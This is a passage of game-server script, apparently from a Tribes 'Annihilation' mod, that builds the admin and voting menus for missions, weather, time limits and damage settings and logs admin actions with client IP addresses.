	else if(%opt == "forceyes" && %cl == $curVoteCount && %clientId.isadmin) 
	{ 
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		Anni::Echo("ADMINMSG: *** " @ Client::getName(%clientId) @ " forced the current vote to PASS!");
		superAdminMsg(%adminName @ " forced the current vote to PASS!");
		$Admin = %name @ " forced a vote to pass. Client ID : "@%client@" IP Address : "@%ip; 
		export("Admin","config\\Admin.log",true);
		$curVoteForce = "YES";
		//%clientId.hv = 0;
	}
	else if(%opt == "forceno" && %cl == $curVoteCount && %clientId.isadmin) 
	{ 
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		Anni::Echo("ADMINMSG: *** " @ Client::getName(%clientId) @ " forced the current vote to FAIL!");
		superAdminMsg(%adminName @ " forced the current vote to FAIL!");
		$Admin = %name @ " forced a vote to fail. Client ID : "@%client@" IP Address : "@%ip; 
		export("Admin","config\\Admin.log",true);
		$curVoteForce = "NO";
		//%clientId.hv = 0;
	}

	else if(%opt == "voteYes" && %cl == $curVoteCount)
	{

		if(%clientId.isGoated == true)
		{
			%clientId.vote = "yes";
			centerprint(%clientId, "", 0);
			Client::sendMessage(%client, 0, "~wPku_ammo.wav");
			return;
		}
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		if(!SmurfCheck(%clientId))
		{		
			%clientId.vote = "yes";
			centerprint(%clientId, "", 0);
		}
	}
	else if(%opt == "voteNo" && %cl == $curVoteCount)
	{
		if(%clientId.isGoated == true)
		{
			%clientId.vote = "no";
			centerprint(%clientId, "", 0);
			Client::sendMessage(%client, 0, "~wPku_ammo.wav");
			return;
		}
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		if(!SmurfCheck(%clientId))
		{		
			%clientId.vote = "no";
			centerprint(%clientId, "", 0);
		}
	}
	else if(%opt == "whisper")
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		if(%clientId.whisper)
			Client::sendMessage(%clientId, 3,"You are no longer whispering to " @ Client::getName(%clientId.whisper) @ ".");
		%clientId.whisper = %cl;
		%cl.whisperFrom = %clientId;
		Client::sendMessage(%clientId, 3,"You are now whispering with " @ Client::getName(%cl) @ ".");
		Client::sendMessage(%clientId, 3,"Use = before your message to send private whispers.");
		Client::sendMessage(%cl, 3,"" @ Client::getName(%clientId) @ " is whispering with you. ~wfemale4.whello.wav");
		return;
	}
	else if(%opt == "nowhisper")
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		%clientId.whisper = "";
		%cl.whisperFrom = "";
		Client::sendMessage(%clientId, 3,"You are no longer whispering to " @ Client::getName(%cl) @ ".");
		return;
	}
	
	else if(%opt == "admin")
	{
//		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		Client::buildMenu(%clientId, "Confirm admim:", "aaffirm", true);
		Client::addMenuItem(%clientId, "1Admin " @ Client::getName(%cl), "yes " @ %cl);
		Client::addMenuItem(%clientId, "2Don't admin " @ Client::getName(%cl), "no " @ %cl);
		return;
	}
	else if(%opt == "smatch" && %clientId.isadmin)
	{
		Admin::startMatch(%clientId);
		return;
	}
	else if(%opt == "cmission" && %clientId.isadmin)
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav"); // NEW
		Admin::changeMissionMenu(%clientId, %opt == "cmission");
		return;
	}

	else if(%opt == "reset" && %clientId.isadmin)
	{
		Client::buildMenu(%clientId, "Confirm Reset:", "raffirm", true);
		Client::addMenuItem(%clientId, "1Reset", "yes");
		Client::addMenuItem(%clientId, "2Don't Reset", "no");
		return;
	}

   else if(%opt == "observe")
   {
      Observer::setTargetClient(%clientId, %cl);
      return;
   }

   else if(%opt == "botmenu")
   {
      Client::buildMenu(%clientId, "Select bot action:", "selbotaction", true);
      Client::addMenuItem(%clientId, "1Spawn bot", "spawnbot");
      Client::addMenuItem(%clientId, "2Remove bot", "removebot");
     return;
   }


   Game::menuRequest(%clientId);
}


function processMenuRAffirm(%clientId, %opt)
{
	%client = Player::getClient(%clientId);
	DebugFun("processMenuRAffirm",%clientId,%opt);
	if(%opt == "yes" && %clientId.isAdmin)
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		if(!%clientId.SecretAdmin)
			messageAll(0, Client::getName(%clientId) @ " reset the server to default settings.~wCapturedTower.wav");
		else
			messageAll(0,"Reseting the server to default settings.~wCapturedTower.wav");
		Server::refreshData();
	}
	Game::menuRequest(%clientId);
}

function processMenuCTLimit(%client, %opt)
{
//	%client = Player::getClient(%clientId);
	DebugFun("processMenuCTLimit",%client,%opt);
	if(%client.isAdmin)
	{	
		if(getword(%opt,0) == "Add")
		{
			%time = getword(%opt,1);
			Anni::Echo("time = "@%time);
			if(%time == -1)
			{
//				Client::sendMessage(%client, 0, "~wPku_ammo.wav");
				Client::buildMenu(%client, "ADD Time:", "CTLimit", true);
				Client::addMenuItem(%client, %curItem++ @ "2 minute", "Add 2");
				Client::addMenuItem(%client, %curItem++ @ "5 minutes", "Add 5");
				Client::addMenuItem(%client, %curItem++ @ "10 minutes", "Add 10");
				Client::addMenuItem(%client, %curItem++ @ "15 minutes", "Add 15");
				Client::addMenuItem(%client, %curItem++ @ "20 minutes", "Add 20");
				Client::addMenuItem(%client, %curItem++ @ "25 minutes", "Add 25");
				Client::addMenuItem(%client, %curItem++ @ "30 minutes", "Add 30");
				Client::addMenuItem(%client, %curItem++ @ "45 minutes", "Add 45");	
			}
			else
			{
				$TA::NoMARecord = true;
				$Server::timeLimit += %time;	//$missionStartTime += (%time * 60);
				if(!%client.SecretAdmin)
				{
//					Client::sendMessage(%client, 0, "~wPku_ammo.wav");
					messageAll(0, Client::getName(%client) @ " added " @ %time @ " minutes to the game.~wCapturedTower.wav");			
				}
				else
				{
//					Client::sendMessage(%client, 0, "~wPku_ammo.wav");					
					messageAll(0, SecretAdmin() @ " added " @ %time @ " minutes to the game.~wCapturedTower.wav");			
			
				}
				Game::checkTimeLimit();
			}			
		}
		else if(%opt == "endmatch")
			nextmap(%client);
		else			
			remoteSetTimeLimit(%client, %opt);					
	}

}

function processMenuVTime(%clientId, %opt)
{
	%client = Player::getClient(%clientId);
	DebugFun("processMenuVTime",%clientId,%opt);
	%option = %opt++;
	if(%option < 1 || %option > 131) 
	{
		Anni::Echo(%clientId@" Trying to exploit VTime with: "@ ann::Clean::string(%opt));
		return;
	}
	Client::sendMessage(%client, 0, "~wPku_ammo.wav");
	Admin::startVote(%clientId, "add " @ %option-- @" minutes to the game.", "VTime", %option);
}

function processMenuPickVote(%clientId, %opt)
{
	DebugFun("processMenuPickVote",%clientId,%opt);
	%opt = getWord(%option, 0);
	%cl = getWord(%option, 1);
}

function processMenuMission(%clientId, %option)
{
	%client = Player::getClient(%clientId);
	DebugFun("processMenuMission",%clientId,%option);
	//Anni::Echo("processMenuMission ",%option);
	%opt = getWord(%option, 0);
	//%type = getWord(%option, 1);
	//Anni::Echo("processMenuMission", %opt);	

	if(%opt == "vcmission")
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		%clientId.MissVote = true;
		Admin::changeMissionMenu(%clientId, %opt == "vcmission");
		return;
	}
	else if(%opt == "VnextMiss")
	{
		%nextMission = $nextMission[$missionName];
		
		if($TA::RandomMission)
			Admin::startVote(%clientId, "start next mission", "NextMap" ,0);
		else
			Admin::startVote(%clientId, "start next mission "@%nextMission, "NextMap" ,0);
		return;
	}
	else if(%opt == "VWeatherAffects")
	{
			Client::buildMenu(%clientId, "Weather Types:", "Mission", true);
			// new
			if(($Snowstorm) || ($Rainstorm))
			{
			Client::sendMessage(%client, 0, "Please wait for the storm to end first. ~wPku_ammo.wav");
			return;
			}
			if(($HeavyRain != 1) && ($Snowstorm != 1) && ($Rainstorm != 1))	 
			{
			if($LightRain)
			{
			Client::addMenuItem(%clientId, %curItem++ @ "Escalate to a heavy rain.", "doheavyrain");
			Client::addMenuItem(%clientId, %curItem++ @ "Vote to start Snow.", "snowoptions");
			Client::addMenuItem(%clientId, %curItem++ @ "Vote to clear the weather.", "clearoption");
			return;
			}
			if($LightSnow)
			{
			Client::addMenuItem(%clientId, %curItem++ @ "Escalate to a heavy snow.", "doheavysnow");
			Client::addMenuItem(%clientId, %curItem++ @ "Vote to start Rain.", "rainoptions");
			Client::addMenuItem(%clientId, %curItem++ @ "Vote to clear the weather.", "clearoption");
			return;
			}
			if($HeavySnow)
			{
			Client::addMenuItem(%clientId, %curItem++ @ "Escalate to a BLIZZARD.", "dosnowstorm");
			Client::addMenuItem(%clientId, %curItem++ @ "Vote to start Rain.", "rainoptions");
			Client::addMenuItem(%clientId, %curItem++ @ "Vote to clear the weather.", "clearoption");
			return;
			}
			}
			if($HeavyRain)
			{
			Client::addMenuItem(%clientId, %curItem++ @ "Escalate to a HURRICANE.", "dorainstorm");
			Client::addMenuItem(%clientId, %curItem++ @ "Vote to start Snow.", "snowoptions");
			Client::addMenuItem(%clientId, %curItem++ @ "Vote to clear the weather.", "clearoption");
			return;
			}
			// end new
			if(!$activehurricane)
			{
			Client::addMenuItem(%clientId, %curItem++ @ "Vote to start Rain.", "rainoptions");
			}
			if(!$activeblizzard)
			{
			Client::addMenuItem(%clientId, %curItem++ @ "Vote to start Snow.", "snowoptions");
			}
			if(((((($LightRain) || ($HeavyRain) || ($LightSnow) || ($HeavySnow) || ($activeblizzard) || ($activehurricane))))))  	
			{
			Client::addMenuItem(%clientId, %curItem++ @ "Vote to clear the weather.", "clearoption");
			}
			return;
	}
	
	else if(%opt == "clearoption")
	{
			if(($Snowstorm != 1) && ($Rainstorm != 1))	
			Admin::startVote(%clientId, "change the weather to a clear day", "StartClearWeather" ,0);
			else if(($Snowstorm) || ($Rainstorm))
			Client::sendMessage(%client, 0, "Please wait for the storm to end first. ~wPku_ammo.wav");
			return;
	}
	
	else if(%opt == "rainoptions")
	{
			Client::buildMenu(%clientId, "Rain Types:", "Mission", true);
			if($HeavyRain) 
			Client::addMenuItem(%clientId, %curItem++ @ "Escalate to a HURRICANE.", "dorainstorm");
			else if(($LightRain != 1) && ($Snowstorm != 1) && ($Rainstorm != 1))	 				
			Client::addMenuItem(%clientId, %curItem++ @ "Change weather to a light rain.", "dolightrain");
			else if(($HeavyRain != 1) && ($Snowstorm != 1) && ($Rainstorm != 1))	
			Client::addMenuItem(%clientId, %curItem++ @ "Escalate to a heavy rain.", "doheavyrain");
			else if(($Snowstorm) || ($Rainstorm))
			Client::sendMessage(%client, 0, "Please wait for the storm to end first. ~wPku_ammo.wav");
			return;
	}
	 
	else if(%opt == "snowoptions")
	{
			Client::buildMenu(%clientId, "Snow Types:", "Mission", true);
			if($HeavySnow)
			Client::addMenuItem(%clientId, %curItem++ @ "Escalate to a BLIZZARD.", "dosnowstorm");			
			else if(($LightSnow != 1) && ($Snowstorm != 1) && ($Rainstorm != 1))		
			Client::addMenuItem(%clientId, %curItem++ @ "Change weather to a light snow.", "dolightsnow");
			else if(($HeavySnow != 1) && ($Snowstorm != 1) && ($Rainstorm != 1))	
			Client::addMenuItem(%clientId, %curItem++ @ "Escalate to a heavy snow.", "doheavysnow");
			else if(($Snowstorm) || ($Rainstorm))
			Client::sendMessage(%client, 0, "Please wait for the storm to end first. ~wPku_ammo.wav");
			return;
	}
	
	else if(%opt == "dorainstorm")
	{
			Admin::startVote(%clientId, "escalate the weather to a HURRICANE", "StartRainstorm" ,0);
			return;
	}	
	
	else if(%opt == "dosnowstorm")
	{
			Admin::startVote(%clientId, "escalate the weather to a BLIZZARD", "StartSnowstorm" ,0);
			return;
	}
	
	else if(%opt == "dolightrain")
	{
			Admin::startVote(%clientId, "change the weather to a light rain", "StartLRain" ,0);
			return;
	}	
	
	else if(%opt == "dolightsnow")
	{
			Admin::startVote(%clientId, "change the weather to a light snow", "StartLSnow" ,0);
			return;
	}
	
	else if(%opt == "doheavyrain")
	{
			Admin::startVote(%clientId, "escalate the weather to a heavy rain", "StartHRain" ,0);
			return;
	}	
	
	else if(%opt == "doheavysnow")
	{
			Admin::startVote(%clientId, "escalate the weather to a heavy snow", "StartHSnow" ,0);
			return;
	}	
	
	else if(%opt == "VReplayMap")
	{
		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		Admin::startVote(%clientId, "restart mission ", "ReplayMap" ,0);
		return;
	}

		
		
	//build random mission type list
	else if(%opt == "VrandomMiss")
	{
//		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		%voteit = getWord(%option, 1);
		Client::buildMenu(%clientId, "Random Mission:", "Mission", true);
		Client::addMenuItem(%clientId, %curItem++ @ "Any Type"@" ("@$MLIST::Count@")", "VRandom 0 ");
		%index = 2; 
		for(%type = 1; %type < $MLIST::TypeCount; %type++)
		{
		// new start
		if($MLIST::Type[%type] != "Training")
		{			
		// new end
				if(%index == 8 && $MLIST::TypeCount > 8)
				{
//					Client::sendMessage(%client, 0, "~wPku_ammo.wav");
					Client::addMenuItem(%clientId, %index @ "More Types...", "VRandom More " @ %index); 
					break; 
				}
				%NumMaps=0;for(%i = 0; getword($MLIST::MissionList[%type],%i) != -1; %i++)	%NumMaps++;				
				Client::addMenuItem(%clientId, %index @ $MLIST::Type[%type]@" ("@%NumMaps@")", "VRandom " @ %type ); 
				%index++;
		// new start
		}
		// new end				
		}	
				
			}
	else if(%opt == "VRandom")
	{
//		Client::sendMessage(%client, 0, "~wPku_ammo.wav");	
		%type = getWord(%option, 1);
		%voteit = getWord(%option, 2);
		if(%type == "0")
		{
			Admin::startVote(%clientId, "pick random mission", "RandomMap" ,"");
			return;	
		}
		
		else if(%type == "More")
		{
//			Client::sendMessage(%client, 0, "~wPku_ammo.wav");
			Client::buildMenu(%clientId, "Random Mission:", "Mission", true);
			%index = 1;
			%type = getWord(%option, 2);
			for(%type; %type < $MLIST::TypeCount; %type++)
			{
		// new start
		if($MLIST::Type[%type] != "Training")
		{			
		// new end
					if(%index == 8 && $MLIST::TypeCount > 8)
					{
//						Client::sendMessage(%client, 0, "~wPku_ammo.wav");
						Client::addMenuItem(%clientId, %index @ "More Types...", "VRandom More " @ %index + %type @ " " @ %voteit); 
						break; 
					}
					%NumMaps=0;
					for(%i = 0; getword($MLIST::MissionList[%type],%i) != -1; %i++)	%NumMaps++;					
					Client::addMenuItem(%clientId, %index @ $MLIST::Type[%type]@" ("@%NumMaps@")", "VRandom " @ %type	@" "@ %voteit); 
					%index++;
		// new start
		}
		// new end						
			}	
		}	
		else 
		{
			Admin::startVote(%clientId, "pick random "@ $MLIST::Type[%type] @" mission", "RandomMap" ,%type);
			return;			
		}
	}		
	
	
	
	else if(%clientId.isAdmin)
	{
		if(%opt == "cmission")
		{
			Client::sendMessage(%client, 0, "~wPku_ammo.wav");
			Admin::changeMissionMenu(%clientId, "cmission");
			return;
		}
		if(%opt == "PickNextMiss")
		{
			Client::sendMessage(%client, 0, "~wPku_ammo.wav");
			%clientId.PickNextMiss = true;
			Admin::changeMissionMenu(%clientId, "PickNextMiss");
			return;			
			
		}
		
		else if(%opt == "ReplayMap")
		{
//			Client::sendMessage(%client, 0, "~wPku_ammo.wav");
			Client::buildMenu(%clientId, "Restart Mission:", "Mission", true);
			Client::addMenuItem(%clientId, %curItem++ @ "Yes, Restart.", "cReplayMap");
			Client::addMenuItem(%clientId, %curItem++ @ "No.", "return");	
			return;
		}
		else if(%opt == "nextMiss")
		{
//			Client::sendMessage(%client, 0, "~wPku_ammo.wav");
			Client::buildMenu(%clientId, "Start Next Mission:", "Mission", true);
			Client::addMenuItem(%clientId, %curItem++ @ "Yes, next.", "cnextMiss");
			Client::addMenuItem(%clientId, %curItem++ @ "No.", "return");	
			return;
		}		
		else if(%opt == "return")
		{
			MissMenu(%clientId,true);
			return;
		}				
		else if(%opt == "cReplayMap")
		{
//			Client::sendMessage(%client, 0, "~wPku_ammo.wav");
			ReplayMap(%clientId);
			return;
		}		
		else if(%opt == "cnextMiss")
		{
//			Client::sendMessage(%client, 0, "~wPku_ammo.wav");
			nextmap(%clientId);
			return;
		}		
		//build random mission type list
		else if(%opt == "randomMiss")
		{
//			Client::sendMessage(%client, 0, "~wPku_ammo.wav");
			%voteit = getWord(%option, 1);
			Client::buildMenu(%clientId, "Random Mission:", "Mission", true);
			Client::addMenuItem(%clientId, %curItem++ @ "Any Type"@" ("@$MLIST::Count@")", "Random 0 "@%voteit);
			%index = 2; 
			for(%type = 1; %type < $MLIST::TypeCount; %type++)
			{
		// new start
		if($MLIST::Type[%type] != "Training")
		{			
		// new end
					if(%index == 8 && $MLIST::TypeCount > 8)
					{
//						Client::sendMessage(%client, 0, "~wPku_ammo.wav");
						Client::addMenuItem(%clientId, %index @ "More Types...", "Random More " @ %index @ " " @ %voteit); 
						break; 
					}
					%NumMaps=0;
					for(%i = 0; getword($MLIST::MissionList[%type],%i) != -1; %i++)	%NumMaps++;				
					Client::addMenuItem(%clientId, %index @ $MLIST::Type[%type]@" ("@%NumMaps@")", " Random " @ %type @ " " @ %voteit); 
					%index++;
		// new start
		}
		// new end						
			}	
					
	
		}
		else if(%opt == "Random")
		{
//			Client::sendMessage(%client, 0, "~wPku_ammo.wav");	
			%type = getWord(%option, 1);
			%voteit = getWord(%option, 2);
			if(%type == "0")
			{
				randommap("",%clientId);
				return;				
			}
			
			else if(%type == "More")
			{
				Client::buildMenu(%clientId, "Random Mission:", "Mission", true);
				%index = 1;
				%type = getWord(%option, 2);
				for(%type; %type < $MLIST::TypeCount; %type++)
				{
		// new start
		if($MLIST::Type[%type] != "Training")
		{			
		// new end
						if(%index == 8 && $MLIST::TypeCount > 8)
						{
//							Client::sendMessage(%client, 0, "~wPku_ammo.wav");
							Client::addMenuItem(%clientId, %index @ "More Types...", "Random More " @ %index + %type @ " " @ %voteit); 
							break; 
						}
						%NumMaps=0;
						for(%i = 0; getword($MLIST::MissionList[%type],%i) != -1; %i++)	%NumMaps++;					
						Client::addMenuItem(%clientId, %index @ $MLIST::Type[%type]@" ("@%NumMaps@")", " Random " @ %type	@" "@ %voteit); 
						%index++;
		// new start
		}
		// new end							
				}	
			}	
			else 
			{		
				randommap(%type,%clientId);
				return;		
			}
		}		
	}
	
	
	

	


}

function mtd(%option) //lets test this fucker
{
	if(%option == "stop")
		return;
	echo($MDESC::Type);
	schedule("mtd();",0.02);
}

function ModMenu(%clientId,%admin) 
{
	DebugFun("MissMenu",%client,%admin);
	Client::buildMenu(%clientId, "Mission Options:", "ModTA", true);
	if($TALT::SpawnType != "AnniSpawn")
		Client::addMenuItem(%clientId, %curItem++ @ "Vote for Annihilation", "vannispawn");
	if($TALT::SpawnType != "EliteSpawn")
		Client::addMenuItem(%clientId, %curItem++ @ "Vote for EliteRenegades", "velitespawn");
	if($TALT::SpawnType != "BaseSpawn")
		Client::addMenuItem(%clientId, %curItem++ @ "Vote for Base", "vbasespawn");
}

function processMenuModTA(%clientId, %option)
{
	DebugFun("processMenuMission",%clientId,%option);
	//Anni::Echo("processMenuMission ",%option);
	%opt = getWord(%option, 0);
	//%type = getWord(%option, 1);
	//Anni::Echo("processMenuMission", %opt);	

	if(%opt == "vannispawn")
	{
		Admin::startVote(%clientId, "change the mod to Annihilation", "vmodannispawn" ,0);
		return;
	}
	else if(%opt == "velitespawn")
	{
		Admin::startVote(%clientId, "change the mod to EliteRenegades", "vmodelitespawn" ,0);
		return;
	}

	else if(%opt == "vbasespawn")
	{
		Admin::startVote(%clientId, "change the mod to Base", "vmodbasespawn" ,0);
		return;
	}
	
}

function MissMenu(%clientId,%admin)
{
	DebugFun("MissMenu",%client,%admin);
	Client::buildMenu(%clientId, "Mission Options:", "Mission", true);
	if(%admin)
	{
//		Client::addMenuItem(%clientId, %curItem++ @ "Vote to change the weather", "VWeatherAffects");
		%nextMission = $nextMission[$missionName];
		Client::addMenuItem(%clientId, %curItem++ @ "Change mission", "cmission");
		if($TA::RandomMission)
			Client::addMenuItem(%clientId, %curItem++ @ "Start next mission", "nextMiss");
		else
			// Client::addMenuItem(%clientId, %curItem++ @ "Start next mission "@%nextMission, "nextMiss");
			   Client::addMenuItem(%clientId, %curItem++ @ "Start next mission", "nextMiss");
		Client::addMenuItem(%clientId, %curItem++ @ "Restart mission", "ReplayMap");
		Client::addMenuItem(%clientId, %curItem++ @ "Random mission", "randomMiss");
		Client::addMenuItem(%clientId, %curItem++ @ "Pick next mission", "PickNextMiss");
		Client::addMenuItem(%clientId, %curItem++ @ "Vote to change the weather", "VWeatherAffects");
	}
	else
	{
//		Client::addMenuItem(%clientId, %curItem++ @ "Vote to change the weather", "VWeatherAffects");
		%nextMission = $nextMission[$missionName];
		Client::addMenuItem(%clientId, %curItem++ @ "Vote to change mission", "vcmission");
		if($TA::RandomMission)
			Client::addMenuItem(%clientId, %curItem++ @ "Vote start next mission", "VnextMiss");
		else
			// Client::addMenuItem(%clientId, %curItem++ @ "Vote start next mission "@%nextMission, "VnextMiss");
			   Client::addMenuItem(%clientId, %curItem++ @ "Vote start next mission", "VnextMiss");
		Client::addMenuItem(%clientId, %curItem++ @ "Vote to restart mission", "VReplayMap");
		Client::addMenuItem(%clientId, %curItem++ @ "Vote random mission", "VrandomMiss");
		Client::addMenuItem(%clientId, %curItem++ @ "Vote to change the weather", "VWeatherAffects");
	}
}

function TimeMenu(%clientId,%admin)
{
	DebugFun("TimeMenu",%clientId,%admin);
	if(%admin)
	{
		Client::buildMenu(%clientId, "Time Options: ("@$Server::timeLimit@")", "CTLimit", true);
		%TimeLeft = (($Server::timeLimit * 60) + $missionStartTime - getSimTime())/60;
		%TimeMatch = ($missionStartTime - getSimTime())/60;
//		messageall(1,%Timeleft@ ", "@%timematch);
		if(10 + %TimeMatch > 0)
			Client::addMenuItem(%clientId, %curItem++ @ "10 minutes", "10");
		else
			Client::addMenuItem(%clientId, %curItem++ @ "End match", "endmatch");
		if(15 + %TimeMatch > 0)
			Client::addMenuItem(%clientId, %curItem++ @ "15 minutes", "15");
		if(20 + %TimeMatch > 0)
			Client::addMenuItem(%clientId, %curItem++ @ "20 minutes", "20");
		if(30 + %TimeMatch > 0)
			Client::addMenuItem(%clientId, %curItem++ @ "30 minutes", "30");
		if(45 + %TimeMatch > 0)
			Client::addMenuItem(%clientId, %curItem++ @ "45 minutes", "45");
		if(60 + %TimeMatch > 0)
			Client::addMenuItem(%clientId, %curItem++ @ "60 minutes", "60");
		Client::addMenuItem(%clientId, %curItem++ @ "Add time", "Add");
		Client::addMenuItem(%clientId, %curItem++ @ "Unlimited", "0");
	}
	else
	{
		Client::buildMenu(%clientId, "Vote Add Time: ("@$Server::timeLimit@")", "VTime", true);
		Client::addMenuItem(%clientId, %curItem++ @ "2 minutes", "2");
		Client::addMenuItem(%clientId, %curItem++ @ "5 minutes", "5");
		Client::addMenuItem(%clientId, %curItem++ @ "10 minutes", "10");
		Client::addMenuItem(%clientId, %curItem++ @ "15 minutes", "15");
		Client::addMenuItem(%clientId, %curItem++ @ "20 minutes", "20");
		Client::addMenuItem(%clientId, %curItem++ @ "25 minutes", "25");
		Client::addMenuItem(%clientId, %curItem++ @ "30 minutes", "30");
		Client::addMenuItem(%clientId, %curItem++ @ "Unlimited", "0");
	}
}

// function processMenuEnabling(%clientId, %option)
// {
//	DebugFun("processMenuEnabling",%clientId,%option);
//	%opt = getWord(%option, 0);
//	
//	 	if(!$ANNIHILATION::VoteAdmin)
//			Client::addMenuItem(%clientId, %curItem++ @ "Enable vote admin", "eVoteAdmin");
//		else
//			Client::addMenuItem(%clientId, %curItem++ @ "Disable vote admin", "dVoteAdmin");
//	 	if(!$DisableVT)
//			Client::addMenuItem(%clientId, %curItem++ @ "Enable voting for Turrets", "eVoteTurrets");
//		else
//			Client::addMenuItem(%clientId, %curItem++ @ "Disable voting for Turrets", "dVoteTurrets");
//
//		if($NoVote == 1)
//			Client::addMenuItem(%clientId, %curItem++ @ "Enable voting", "eVote");
//		else
//			Client::addMenuItem(%clientId, %curItem++ @ "Disable voting", "dVote");
//	
// }

// function EnablingMenu(%clientId,%admin)
// {
//	DebugFun("EnablingMenu",%clientId,%admin);
//		Client::buildMenu(%clientId, "Enabling Options:", "MenuEnabling", true);
//
//		Client::addMenuItem(%clientId, %curItem++ @ "Voting for Admins", "AdminsVoting");
//		Client::addMenuItem(%clientId, %curItem++ @ "Voting for Turrets", "TurretsVoting");
//		Client::addMenuItem(%clientId, %curItem++ @ "Voting for Voting", "VotingVoting");
// }

function processmenuBuilding(%clientId, %option)
{
	%opt = getWord(%option, 0);
	%cl = getWord(%option, 1);

	if(%opt == "vetbm")
	{
		Admin::startVote(%clientId, "Enable Building Mode", "ebmt", 0);
	}
	else if(%opt == "vdtbm")
	{
		Admin::startVote(%clientId, "Disable Building Mode", "dbmt", 0);
	}
	else if(%opt == "veabm")
	{
		Admin::startVote(%clientId, "Enable Advanced Building Mode", "etabm", 0);
	}
	else if(%opt == "vdabm")
	{
		Admin::startVote(%clientId, "Disable Advanced Building Mode", "dtabm", 0);
	}
}

function processmenuDamage(%clientId, %option)
{
		%client = Player::getClient(%clientId);
	DebugFun("processmenuDamage",%clientId,%option);
	%opt = getWord(%option, 0);
	%cl = getWord(%option, 1);

//team damage
	if(%opt == "vetd")
		Admin::startVote(%clientId, "Enable team damage", "etd", 0);
	else if(%opt == "vdtd")
		Admin::startVote(%clientId, "Disable team damage", "dtd", 0);
	
// base/gen damage
	if(%opt == "veBaseD")
		Admin::startVote(%clientId, "Enable gen/ station damage", "eBaseD", 0);
	else if(%opt == "vdBaseD")
		Admin::startVote(%clientId, "Disable gen/ station damage", "dBaseD", 0);

// base healing
	if(%opt == "veBaseH")
		Admin::startVote(%clientId, "Enable base healing", "eBaseH", 0);
	else if(%opt == "vdBaseH")
		Admin::startVote(%clientId, "Disable base healing", "dBaseH", 0);

//Out of area damage
	if(%opt == "veOutAreaD")
		Admin::startVote(%clientId, "Enable map boundries.", "eOutAreaD", 0);
	else if(%opt == "vdOutAreaD")
		Admin::startVote(%clientId, "Disable map boundry.", "dOutAreaD", 0);
//player damage
	if($Arena::Kill)
	{
				Client::sendMessage(%client, 0, "cannot disable damage on this map type. ~wPku_ammo.wav");
		// Arena::Clear();	
		return;
	}

	if(%opt == "vePlayerD" && $Annihilation::VPdamage)
		Admin::startVote(%clientId, "Enable player damage", "ePlayerD", 0);
	else if(%opt == "vdPlayerD" && $Annihilation::VPdamage)
		Admin::startVote(%clientId, "Disable player damage", "dPlayerD", 0);
			
	if(%clientId.isadmin)
	{	
		if(%opt == "eOutAreaD") {
			Admin::setAreaDamageEnable(%clientId, true);
				%ip = Client::getTransportAddress(%clientId); 
				%name = Client::getName(%clientId);
				$Admin = %name @ " enabled map boundries. Client ID : "@%client@" IP Address : "@%ip; 
				export("Admin","config\\Admin.log",true); }
		else if(%opt == "dOutAreaD") {
			Admin::setAreaDamageEnable(%clientId, false);
				%ip = Client::getTransportAddress(%clientId); 
				%name = Client::getName(%clientId);
				$Admin = %name @ " disabled map boundries. Client ID : "@%client@" IP Address : "@%ip; 
				export("Admin","config\\Admin.log",true); }
		else if(%opt == "eBaseH") {
			Admin::setBaseHealingEnable(%clientId, true);
				%ip = Client::getTransportAddress(%clientId); 
				%name = Client::getName(%clientId);
				$Admin = %name @ " enabled base healing. Client ID : "@%client@" IP Address : "@%ip; 
				export("Admin","config\\Admin.log",true); }
		else if(%opt == "dBaseH") {
			Admin::setBaseHealingEnable(%clientId, false);
				%ip = Client::getTransportAddress(%clientId); 
				%name = Client::getName(%clientId);
				$Admin = %name @ " disabled base healing. Client ID : "@%client@" IP Address : "@%ip; 
				export("Admin","config\\Admin.log",true); }
		else if(%opt == "eBaseD") {
			Admin::setBaseDamageEnable(%clientId, true);
				%ip = Client::getTransportAddress(%clientId); 
				%name = Client::getName(%clientId);
				$Admin = %name @ " enabled base damage. Client ID : "@%client@" IP Address : "@%ip; 
				export("Admin","config\\Admin.log",true); }
		else if(%opt == "dBaseD") {
			Admin::setBaseDamageEnable(%clientId, false);
				%ip = Client::getTransportAddress(%clientId); 
				%name = Client::getName(%clientId);
				$Admin = %name @ " disabled base damage. Client ID : "@%client@" IP Address : "@%ip; 
				export("Admin","config\\Admin.log",true); }	
		else if(%opt == "etd") {
			Admin::setTeamDamageEnable(%clientId, true);
				%ip = Client::getTransportAddress(%clientId); 
				%name = Client::getName(%clientId);
				$Admin = %name @ " enabled team damage. Client ID : "@%client@" IP Address : "@%ip; 
				export("Admin","config\\Admin.log",true); }
		else if(%opt == "dtd") {
			Admin::setTeamDamageEnable(%clientId, false);
				%ip = Client::getTransportAddress(%clientId); 
				%name = Client::getName(%clientId);
				$Admin = %name @ " disabled team damage. Client ID : "@%client@" IP Address : "@%ip; 
				export("Admin","config\\Admin.log",true); }	
				
		else if(%opt == "ePlayerD") 
		{
			Admin::setPlayerDamageEnable(%clientId, true);
				%ip = Client::getTransportAddress(%client); 
				%name = Client::getName(%client);
				$Admin = %name @ " enabled player damage. Client ID : "@%client@" IP Address : "@%ip; 
				export("Admin","config\\Admin.log",true); 
		}
		else if(%opt == "dPlayerD") 
		{
			Admin::setPlayerDamageEnable(%clientId, false);
				%ip = Client::getTransportAddress(%client); 
				%name = Client::getName(%client);
				$Admin = %name @ " disabled player damage. Client ID : "@%client@" IP Address : "@%ip; 
				export("Admin","config\\Admin.log",true);
		}													
	}	

	
}
function processmenuVoteFlag(%clientId, %option)
{
	DebugFun("processmenuVoteFlag",%clientId,%option);
	%opt = getWord(%option, 0);
	%cl = getWord(%option, 1);

//team damage
	if(%opt == "veFlag" && $annihilation::voteFlagCaps)
		Admin::startVote(%clientId, "Enable Flag Cap Limit", "eFlag", 0);
	else if(%opt == "vdFlag" && $annihilation::voteFlagCaps)
		Admin::startVote(%clientId, "Disable Flag Cap Limit", "dFlag", 0);

// base/gen damage
//Hunter added 
	if(%opt == "veHunter")
